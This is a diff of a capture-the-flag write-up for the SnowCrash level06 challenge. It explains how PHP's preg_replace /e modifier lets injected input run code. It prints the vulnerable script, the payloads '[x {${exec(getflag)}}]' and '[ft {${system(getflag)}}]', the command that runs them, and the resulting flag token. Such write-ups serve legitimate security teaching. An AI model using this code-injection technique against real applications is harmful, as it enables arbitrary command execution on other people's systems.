@@ -1,34 +1,41 @@
-# cat README
+we can see the level06.php
+
 ```
-level06@BornToSec:~$ cat README
-<?${[]}.= (...) {![]}?><?=${![]};
-You can try to understand this little script php and there is a chance to have this flag..
-/!\ If you try to run it make sure you understand all this code ..:)/!\
-Or just exploit this single small script on this folder.
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
 ```
 
-# preg_replace('/USERINPUT/e') is very dangerous
-# http://php.net/manual/en/reference.pcre.pattern.modifiers.php
-# we just need to insert a call to system(getflag)
-# just dont forget /(\[ft (.*)\])/e
-# so the payload will look like
+you can see that they use the /e regex modifier that eval any paramaters given, so easily exploitable, we just have to meet the needs to the $2 replacement
 ```
-[ft whateverMalicous]
+(\[x (.*)\])
 ```
-# https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
-```
-For example the above example can be used to execute arbitrary PHP code by passing the string <h1>{${eval($_GET[php_code])}}</h1>. The evaluted code in this case would be "<h1>" . strtoupper("{${eval($_GET[php_code])}}") . "</h1>" and as such execute any PHP code passed in the php_code GET variable.
+the first capture group is `\[x (.*)\]` so `[x blibloublou]` will match.
+
+the second capture group is (.*) and that what's given to the y function
+
+we can now build an exploit
+
 ```
 
-# in our case we want the flag so
-```
-[ft {${system(getflag)}}]
+[x {${exec(getflag)}}]
+
 ```
 
-# result
+the `{${exec(...)}}` will execute any given command as the shell own by the user who own the script here flag06
+
+as PHP is the most beautiful language here the error given
+
 ```
-level06@BornToSec:~$ ./level06 /tmp/tommy/payload
-PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(16) : regexp code on line 1
-Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
-PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(16) : regexp code on line 1
+
+level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/toto; ./level06 /tmp/toto aa
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
 ```
+
+we notice that the getflag function just generated an error but was executed properly, we now own the flag.
+
+more about the /e modifier: http://php.net/manual/en/reference.pcre.pattern.modifiers.php
